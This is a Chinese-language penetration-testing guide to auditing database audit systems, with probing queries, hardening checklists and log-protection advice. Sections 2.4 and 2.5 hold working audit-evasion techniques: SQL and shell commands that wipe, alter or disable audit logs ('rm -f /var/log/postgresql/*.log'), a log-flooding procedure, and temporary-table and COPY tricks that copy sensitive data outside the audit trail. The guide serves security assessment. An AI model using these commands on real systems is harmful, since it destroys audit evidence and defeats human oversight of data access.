# 数据库审计测试 (Database Audit Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供数据库审计系统的安全测试方法论，帮助测试人员评估数据库审计机制的有效性。

### 1.2 适用范围
本文档适用于以下场景：
- MySQL/MariaDB 审计测试
- PostgreSQL 审计测试
- Oracle 审计测试
- SQL Server 审计测试
- 数据库审计日志完整性验证

### 1.3 读者对象
- 渗透测试工程师
- 数据库安全分析师
- DBA
- 合规审计人员

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

数据库审计系统记录数据库操作，用于安全监控和合规要求。数据库审计测试关注审计覆盖范围、审计日志保护和审计绕过技术。

**核心原理：**
- **审计配置缺陷**：审计未启用或配置不完整
- **审计日志保护不足**：审计日志可被篡改或删除
- **审计盲区利用**：某些操作未被审计
- **权限绕过**：低权限用户执行高权限操作未被记录

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **数据查询** | SELECT 操作 | 敏感数据查询未审计 |
| **数据修改** | INSERT/UPDATE/DELETE | 修改操作无完整记录 |
| **权限变更** | GRANT/REVOKE | 权限变更未审计 |
| **结构变更** | CREATE/ALTER/DROP | DDL 操作无审计 |
| **管理操作** | 备份、恢复 | 管理操作未记录 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**MySQL 审计探测：**
```sql
-- 检查审计插件状态
SHOW PLUGINS;
SHOW VARIABLES LIKE 'audit%';

-- 检查日志文件
SHOW VARIABLES LIKE 'log_%';

-- 测试操作是否被审计
SELECT 'test_audit_probe';

-- 检查审计日志
-- 取决于审计插件类型
-- 文件：/var/log/mysql/audit.log
-- 表：mysql.audit_log
```

**PostgreSQL 审计探测：**
```sql
-- 检查日志配置
SHOW config_file;
SHOW log_destination;
SHOW logging_collector;
SHOW log_statement;
SHOW log_min_duration_statement;

-- 检查 pgAudit 扩展
SELECT * FROM pg_extension WHERE extname = 'pgaudit';

-- 测试审计
SELECT 'test_audit_probe';
```

**SQL Server 审计探测：**
```sql
-- 检查审计配置
SELECT * FROM sys.server_audits;
SELECT * FROM sys.database_audits;

-- 检查审计规范
SELECT * FROM sys.server_audit_specifications;
SELECT * FROM sys.database_audit_specifications;

-- 查询审计日志
SELECT * FROM sys.fn_get_audit_file('C:\Audit\*', NULL, NULL);
```

#### 2.3.2 白盒测试

**MySQL 配置审计：**
```ini
# my.cnf 危险配置
[mysqld]
# 危险：未启用通用日志
general_log = 0

# 危险：未启用慢查询日志
slow_query_log = 0

# 危险：审计插件未安装
# plugin_load_add = audit_log.so

# 危险：错误日志级别过低
log_error_verbosity = 1
```

**PostgreSQL 配置审计：**
```conf
# postgresql.conf 危险配置
log_destination = 'stderr'  # 应包含 'csvlog'
logging_collector = off     # 应启用
log_statement = 'none'      # 应为 'all' 或 'mod'
log_min_duration_statement = -1  # 应记录所有语句
```

### 2.4 漏洞利用方法

#### 2.4.1 审计盲区利用

```sql
-- MySQL：某些操作可能未被审计
-- 1. 使用注释绕过
SELECT /* secret */ * FROM sensitive_table;

-- 2. 使用存储过程
CALL execute_immediate('DELETE FROM audit_log');

-- 3. 使用预编译语句
PREPARE stmt FROM 'DELETE FROM audit_log WHERE id=1';
EXECUTE stmt;

-- PostgreSQL：使用 COPY 绕过
COPY sensitive_data TO '/tmp/data.csv';
-- 可能不被审计
```

#### 2.4.2 审计日志篡改

```sql
-- MySQL：如果有 FILE 权限
-- 清空日志文件
SELECT '' INTO OUTFILE '/var/log/mysql/audit.log';

-- 修改日志
UPDATE mysql.audit_log SET event_time=NOW() WHERE id=1;

-- SQL Server：如果有权限
-- 清除审计
ALTER AUDIT SPECIFICATION [spec_name] WITH (STATE=OFF);
DROP AUDIT SPECIFICATION [spec_name];
```

```bash
# 操作系统层面
# 如果有文件权限
echo "" > /var/log/mysql/audit.log
rm -f /var/log/postgresql/*.log
```

#### 2.4.3 审计 DoS 攻击

```sql
-- 生成大量审计日志淹没系统
-- MySQL
DELIMITER $$
CREATE PROCEDURE flood_audit()
BEGIN
  DECLARE i INT DEFAULT 1;
  WHILE i <= 10000 DO
    SELECT i;
    SET i = i + 1;
  END WHILE;
END$$
DELIMITER ;
CALL flood_audit();

-- PostgreSQL
SELECT generate_series(1, 10000);
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过语句审计

```sql
-- 如果审计基于语句类型
-- 使用等价但不同的语法

-- 原始（被审计）
DELETE FROM users WHERE id=1;

-- 绕过（可能不被审计）
TRUNCATE users;  -- 如果只审计 DELETE
-- 或
UPDATE users SET active=0 WHERE id=1;  -- 软删除
```

#### 2.5.2 利用临时表

```sql
-- 临时表操作可能不被审计
CREATE TEMPORARY TABLE temp_data AS
SELECT * FROM sensitive_table;

-- 在临时表中处理敏感数据
-- 会话结束后临时表自动删除
DROP TEMPORARY TABLE temp_data;
```

---

## 第三部分：附录

### 3.1 数据库审计配置检查清单

| **数据库** | **配置项** | **安全设置** |
| :--- | :--- | :--- |
| MySQL | 审计插件 | 启用 |
| MySQL | 通用日志 | 生产环境谨慎启用 |
| PostgreSQL | log_statement | 'all' 或 'mod' |
| PostgreSQL | pgaudit | 启用扩展 |
| SQL Server | 审计规范 | 启用关键操作 |
| Oracle | 统一审计 | 启用 |

### 3.2 审计日志保护建议

- 审计日志存储在与数据库分离的服务器上
- 启用审计日志完整性保护（WORM 存储）
- 限制审计日志访问权限（仅审计员可访问）
- 配置审计日志告警（异常访问时告警）
- 定期备份审计日志到安全位置

### 3.3 参考资源

- [MySQL Audit Plugin](https://dev.mysql.com/doc/refman/8.0/en/audit-log.html)
- [PostgreSQL pgaudit](https://www.pgaudit.org/)
- [SQL Server Audit](https://docs.microsoft.com/en-us/sql/relational-databases/security/auditing/database-auditing-sql-server)
- [CIS Database Benchmarks](https://www.cisecurity.org/)
